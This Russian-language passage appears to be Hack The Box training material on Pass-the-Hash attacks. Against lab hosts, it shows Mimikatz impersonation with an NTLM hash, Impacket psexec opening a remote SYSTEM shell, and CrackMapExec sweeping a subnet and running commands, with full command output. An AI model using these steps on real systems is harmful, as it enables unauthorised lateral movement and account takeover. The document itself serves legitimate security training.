## Передайте хэш с Mimikatz (Windows)

Первым инструментом, который мы будем использовать для проведения атаки Pass the Hash, является [Mimikatz](https://github.com/gentilkiwi) . Mimikatz имеет модуль с именем `sekurlsa::pth`это позволяет нам выполнить атаку Pass the Hash, запустив процесс с использованием хэша пароля пользователя. Для использования этого модуля нам потребуется следующее:

-   `/user`- Имя пользователя, которое мы хотим олицетворять.
-   `/rc4`или `/NTLM`- NTLM-хэш пароля пользователя.
-   `/domain`- Домен, к которому принадлежит пользователь, которого нужно олицетворить. В случае локальной учетной записи пользователя мы можем использовать имя компьютера, localhost или точку (.).
-   `/run`- Программа, которую мы хотим запустить с контекстом пользователя (если не указано, она запустит cmd.exe).
```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

Теперь мы можем использовать cmd.exe для выполнения команд в контексте пользователя. Для этого примера `julio`может подключиться к общей папке с именем `julio`на ДК.

## Передайте хэш с помощью Impacket (Linux)

#### Передайте хэш с помощью Impacket PsExec
```shell-session
lizergindoma@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Передайте хэш с помощью CrackMapExec (Linux)
```shell-session
lizergindoma@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

#### CrackMapExec — выполнение команд
```shell-session
lizergindoma@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

